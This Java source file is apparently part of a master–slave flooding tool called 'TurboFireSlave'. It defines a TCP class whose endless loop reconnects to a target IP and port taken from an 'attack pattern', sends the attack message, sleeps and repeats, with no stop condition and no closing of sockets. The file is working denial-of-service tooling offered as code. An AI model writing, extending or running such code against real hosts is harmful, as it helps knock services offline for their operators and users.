package protocols.interfaces;

import utilies.AttackPattern;
import view.GUI;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

import app.TurboFireSlave;

public abstract class TransmissionControlProtocolInterface extends Protocol {

    private Socket socket;

    public TransmissionControlProtocolInterface(AttackPattern attackPattern, String masterAddress, int masterPort) {
        super(attackPattern, masterAddress, masterPort);
    }

    @Override
    public void run() {
        
        
        //SE DER RUIM AQUI, TEM QUE COLOCAR CONDICAO DE PARADA STOP THREAD
        //while(!Thread.currentThread().isInterrupted() && (this.socket.isConnected() && !this.socket.isClosed())) {
        while(true) {
            createConnection();
            connect();
            writeMessage(getAttackPattern().getMessage());
            try {
                Thread.sleep(getAttackPattern().getAttackRange());
            } catch (InterruptedException ex) {
                GUI.showExceptionLog(ex.toString());
            } catch (Exception e) {
                GUI.showExceptionLog(e.toString());
            }
        }
    }

    public void createConnection() {
        setAddress(new InetSocketAddress(getAttackPattern().getIP(), getAttackPattern().getPort()));
        this.socket = new Socket();
        
        try {
            this.socket.setKeepAlive(true);
            this.socket.setSoTimeout(getAttackPattern().getConnectionTimeOut());
        } catch (SocketException se) {
            GUI.showExceptionLog(se.toString());
        } catch (Exception e) {
            GUI.showExceptionLog(e.toString());
        }
    }

    public void connect() {
        try {
            if(this.socket != null) {
                this.socket.connect(getAddress());
            }
        } catch (UnknownHostException uhe) {
            GUI.showExceptionLog(uhe.toString());
        } catch (SocketException se) {
            GUI.showExceptionLog(se.toString());
        } catch (IOException ioe) {
            GUI.showExceptionLog(ioe.toString());
        } catch (Exception e) {
            GUI.showExceptionLog(e.toString());
        }
    }

    public void closeConnection() {
        try {
            if(this.socket != null && !this.socket.isClosed() && this.socket.isBound()) {
                this.socket.close();
            }
        } catch (IOException ioe) {
            GUI.showExceptionLog(ioe.toString());
        } catch (Exception e) {
            GUI.showExceptionLog(e.toString());
        }
    }

    public void setSocket(Socket socket) {
        this.socket = socket;
    }

    public Socket getSocket() {
        return this.socket;
    }

}